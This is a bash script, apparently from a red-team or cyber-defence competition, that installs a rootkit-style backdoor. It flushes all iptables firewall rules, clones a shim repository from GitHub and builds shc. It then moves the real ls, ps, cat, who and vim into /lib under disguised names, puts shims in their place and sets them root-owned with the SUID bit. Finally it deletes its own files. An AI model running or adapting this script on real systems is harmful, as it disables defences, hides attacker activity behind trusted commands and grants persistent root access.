#!/bin/bash

# Install packages that may not be present
# Replace 'apt' with the package manager of the target machine
apt install git
apt install vim
apt install gcc
apt install make
apt install automake

# Flush iptables to make sure github isn't blocked
iptables -F
iptables -t mangle -F
iptables -t nat -F
iptables -t filter -F

iptables -P OUTPUT ACCEPT
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT

# Clone the repository
git clone https://github.com/shadow5229/CDT-Tools.git

# Clone a tool that will allow for 'compiled' scripts
# This will allow the SUID bit to be set and used properly
git clone https://github.com/neurobin/shc.git

# Install shc
./shc/configure
make
make install


# Or if you are hosting on a webserver, comment out the line above (git clone)
# and uncomment the following lines

# *** ADD WEBSERVER INSTALLTION HERE ***


# Move "healthy" binaries out of /bin
# Note: Some of these paths are OS dependent
# *** Tested on: Xubuntu 18.04
mv /bin/ls /lib/module_ls
mv /bin/ps /lib/module_ps
mv /bin/cat /lib/module_cat
mv /usr/bin/who /lib/module_who
mv /usr/bin/vim /lib/module_vim

# Move the shim scripts into /bin with original names
mv CDT-Tools/ls_shim/ls_new /bin/ls
mv CDT-Tools/ps_shim/ps_new /bin/ps
mv CDT-Tools/cat_shim/cat_new /bin/cat
mv CDT-Tools/who_shim/who_new /bin/who
mv CDT-Tools/vim_shim/vim_new /bin/vim

# Make each script executable
chmod +x /bin/ls 
chmod +x /bin/ps
chmod +x /bin/cat
chmod +x /bin/who
chmod +x /bin/vim

# Set SUID bit
chown root:root /bin/ls
chown root:root /bin/ps
chown root:root /bin/cat
chown root:root /bin/who
chown root:root /bin/vim

# Set the SUID bit for root so that all commands will always run
chmod u+s /bin/ls
chmod u+s /bin/ps
chmod u+s /bin/cat
chmod u+s /bin/who
chmod u+s /bin/vim

# Cleanup the mess
rm -r CDT-Tools
